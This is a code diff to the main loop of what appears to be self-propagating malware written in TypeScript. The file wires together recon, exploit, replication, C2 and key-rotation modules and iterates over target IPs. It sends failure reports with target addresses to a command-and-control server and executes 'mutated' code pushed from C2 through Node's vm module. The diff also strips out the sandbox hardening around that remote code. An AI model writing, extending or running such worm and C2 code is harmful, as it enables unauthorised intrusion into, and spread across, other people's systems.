@@ -1,10 +1,10 @@
-import * as recon from './modules/recon';
-import * as exploit from './modules/exploit';
-import * as replication from './modules/replication';
-import { reportFailure } from './modules/c2';
-import { generateKey, rotateKey } from './modules/crypto';
-import { initializeConnector } from './modules/connector';
-import { logger } from './utils';
+import * as recon from './modules/recon.js';
+import * as exploit from './modules/exploit.js';
+import * as replication from './modules/replication.js';
+import { reportFailure } from './modules/c2.js';
+import { generateKey, rotateKey } from './modules/crypto.js';
+import { initializeConnector } from './modules/connector.js';
+import { logger } from './utils/logger.js';
 import vm from 'vm';
 
 const EXPLOIT_SUCCESS_RATE = 0.3; // 30% chance of success
@@ -16,9 +16,7 @@ const applyMutation = (mutatedCode: string | null): void => {
     try {
         logger.info('Module [Mutation]: Applying new code received from C2...');
 
-        // Create a more secure sandbox to prevent prototype pollution or escapes.
         const sandbox = {
-            // Expose a safe, limited logger, not the full winston instance.
             logger: {
                 info: (msg: string) => logger.info(msg),
                 warn: (msg: string) => logger.warn(msg),
@@ -26,12 +24,7 @@ const applyMutation = (mutatedCode: string | null): void => {
             },
             setTimeout,
         };
-        vm.createContext(Object.create(null)); // Create a context with a null prototype
-        vm.runInContext(`
-            this.logger = logger;
-            this.setTimeout = setTimeout;
-        `, vm.createContext(sandbox));
-
+        const context = vm.createContext(sandbox);
 
         const patchableModules: { [key: string]: any } = {
             exploit,
@@ -40,7 +33,7 @@ const applyMutation = (mutatedCode: string | null): void => {
         };
 
         const script = new vm.Script(`(${mutatedCode})`);
-        const newImplementationsByModule = script.runInContext(vm.createContext(sandbox));
+        const newImplementationsByModule = script.runInContext(context);
 
         for (const moduleName in newImplementationsByModule) {
             if (Object.prototype.hasOwnProperty.call(patchableModules, moduleName)) {
@@ -90,7 +83,6 @@ async function main(): Promise<void> {
                 } else {
                     failureCount++;
                     const error = exploit.getLastError();
-                    // Properly handle the async report without blocking the loop but catching errors
                     reportFailure({ ...error, targetIp: target.ip }, currentKey).catch(e => {
                         logger.error(`Error in background reportFailure call: ${e.message}`);
                     });
@@ -102,7 +94,6 @@ async function main(): Promise<void> {
                 }
             } catch (err: any) {
                 logger.error(`An error occurred in the main loop for target ${target.ip}: ${err.message}`);
-                // Report critical failures from exploit/replication modules
                  reportFailure({ type: 'critical_error', details: err.message, targetIp: target.ip }, currentKey).catch(e => {
                     logger.error(`Error in background reportFailure call for critical error: ${e.message}`);
                 });
